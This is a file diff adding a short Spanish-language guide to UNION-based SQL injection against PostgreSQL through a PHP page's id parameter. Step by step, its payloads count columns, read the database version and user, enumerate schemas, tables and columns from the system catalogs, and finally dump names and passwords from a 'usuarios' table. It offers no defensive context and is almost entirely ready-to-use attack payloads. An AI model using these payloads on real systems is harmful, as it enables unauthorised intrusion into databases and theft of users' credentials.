@@ -1,0 +1,36 @@
+GUIA PARA INYECCION EN POSTGRESQL 
+
+1- Comprobar cuantas columnas tiene la tabla mediante UNION SELECT:
+	
+	../producto.php?id=-1' union select null -- 
+	../producto.php?id=-1' union select null, null, null
+	
+2- Una vez reconocemos la cantidad de columnas, averiguamos la version de la bbdd, el nombre de la bd actual y el usuario actual 
+	
+	../producto.php?id=-1' union select null,version(),current_database()||'<p>'||user,null --'
+
+3- Ahora contamos cuantos NameSpaces contiene la bbdd
+
+	../producto.php?id='-1' union select null,null,null,count(*) from pg_namespace --'
+
+4- Sacamos el nombre de cada NameSpace para ver cual nos interesa atacar
+
+	../producto.php?id='-1' union select null, nspname,null, null from pg_namespace order by 1 limit 1 offset 0 --'
+	../producto.php?id='-1' union select null, nspname,null, null from pg_namespace order by 1 limit 1 offset 1 --'
+	../producto.php?id='-1' union select null, nspname,null, null from pg_namespace order by 1 limit 1 offset 2 --'
+
+	.. hasta offset 6, en este caso.
+
+5- Una vez detectado el NameSpace que queremos atacar, obtenemos informacion acerca de sus tablas
+
+	../productos.php?id='-1' UNION SELECT null, relname, null, null FROM pg_class, pg_namespace WHERE pg_class.relnamespace=pg_namespace.oid
+				 AND nspname='public' AND relkind='r' ORDER BY 1 LIMIT 1 OFFSET 0 --'
+
+6- Una vez detectada la tabla que nos interesa, obtenemos informacion acerca de sus columnas
+
+	../productos.php?id='-1' union select null, attname,typname,null from pg_class, pg_namespace, pg_attribute, pg_type where attnum=2
+				 and pg_type.oid=atttypid and attrelid=pg_class.oid and relname='usuarios' and pg_class.relnamespace=pg_namespace.oid and nspname='public' --'
+
+7- Ya tenemos los campos de la tabla de los cuales queremos substraer la información, ahora los explotamos
+	
+	../productos.php?id='-1' union select null,nombre||'<p>'||contrasenya, null, null from usuarios order by 1 limit 1 offset 0 --'
